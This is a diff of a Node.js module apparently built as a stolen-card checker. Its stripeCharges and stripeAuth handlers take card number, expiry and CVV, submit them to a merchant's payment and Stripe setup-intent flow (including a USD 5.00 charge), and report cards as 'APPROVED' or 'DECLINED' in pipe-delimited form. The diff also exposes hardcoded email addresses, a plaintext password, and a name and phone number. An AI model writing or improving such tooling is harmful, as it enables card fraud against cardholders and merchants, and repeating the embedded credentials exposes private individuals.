@@ -1,26 +1,16 @@
-const { chromium } = require("@playwright/test");
 const { isLuhnValid } = require("../helps/index.js");
 const axios = require('axios');
 const cheerio = require('cheerio');
 
 const stripeCharges = async (req, res) => {
-  const { cardNumber, cardExpiry, cardCvv, name } = req.body
-  const emails = [
-    "Nueva.amapasa@outlook.com",
-    "juanjoseamapa@gmail.com",
-    "juanjoseamapasa@gmail.com",
-    "master.bineta@gmail.com",
-    "alejandroamapa@gmail.com"
-  ]
-  const password = "Sanchez1."
-  const email = emails[Math.floor(Math.random() * 5)]
+  const { cardNumber, cardExpiry, cardCvv } = req.body
 
   async function CheckCard() {
     try {
       const isCardNumberValid = isLuhnValid(cardNumber);
       if (!isCardNumberValid) {
         return res.json({
-          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
+          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
           status: "invalid_card_number",
           error: true,
         })
@@ -68,7 +58,7 @@ const stripeCharges = async (req, res) => {
       const dataCharge = new URLSearchParams({
         "first-name": "Raul",
         "last-name": "Asencio",
-        "email": "juanjoseama@gmail.com",
+        "email": "juanjosea102@gmail.com",
         "phone": "6674278938",
         "amount": "USD 5.00",
         "note": "",
@@ -133,9 +123,7 @@ const stripeCharges = async (req, res) => {
 };
 
 const stripeAuth = async (req, res) => {
-  const { cardNumber, cardExpiry, cardCvv, name } = req.body
-  const email = "juanjoseamapa@gmail.com"
-  const password = "Sanchez1."
+  const { cardNumber, cardExpiry, cardCvv } = req.body
 
   async function CheckCard() {
     try {
@@ -143,7 +131,7 @@ const stripeAuth = async (req, res) => {
       if (!isCardNumberValid) {
         return res.json({
           card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
-          status: "invalid_card_number",
+          status: "invalid_card_number ❌",
           error: true,
         })
       }
@@ -154,9 +142,6 @@ const stripeAuth = async (req, res) => {
       const userInfo = randomUserResponse.data.results[0];
       const email = userInfo.email;
       const zipcode = userInfo.location.postcode;
-      // console.log(userInfo)
-      // console.log(email)
-      // console.log(zipcode)
 
       // Create a session with cookies (simulated in Node.js with axios)
       const session = axios.create({
@@ -290,11 +275,11 @@ const stripeAuth = async (req, res) => {
       const confirmSetupIntentResponse = await session.post(confirmSetupIntentUrl, confirmSetupIntentData, { headers });
 
       const responseJson = confirmSetupIntentResponse.data;
-      console.log('response', responseJson)
+      // console.log('response', responseJson)
 
       if (responseJson.success === false) {
         const errorMessage = responseJson.data.error.message || "Unknown error";
-        console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : ${errorMessage.includes("incorrect_address") ? "APPROVED AVS ✅" : "DECLINED ❌"} , MESSAGE : ${errorMessage} ❌`);
+        // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : ${errorMessage.includes("incorrect_address") ? "APPROVED AVS ✅" : "DECLINED ❌"} , MESSAGE : ${errorMessage} ❌`);
         return res.json({
           card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
           status: errorMessage.includes("incorrect_address") ? "APPROVED AVS ✅" : "DECLINED ❌",
@@ -304,7 +289,7 @@ const stripeAuth = async (req, res) => {
       } else if (responseJson.success === true) {
         const status = responseJson.data.status || "unknown";
         if (status === "requires_action") {
-          console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : APPROVED 3DS ✅ , MESSAGE : ${status} ❌`);
+          // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : APPROVED 3DS ✅ , MESSAGE : ${status} ❌`);
           return res.json({
             card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
             status: "APPROVED 3DS ✅",
@@ -312,7 +297,7 @@ const stripeAuth = async (req, res) => {
             error: false
           });
         } else {
-          console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : APPROVED ✅ , MESSAGE : ${status} ✅`);
+          // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : APPROVED ✅ , MESSAGE : ${status} ✅`);
           return res.json({
             card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
             status: "APPROVED ✅",
@@ -321,7 +306,7 @@ const stripeAuth = async (req, res) => {
           });
         }
       } else {
-        console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : UNKNOWN ❌ , MESSAGE : Respuesta inesperada del servidor.`);
+        // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : UNKNOWN ❌ , MESSAGE : Respuesta inesperada del servidor.`);
         return res.json({
           card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
           status: "UNKNOWN ❌",
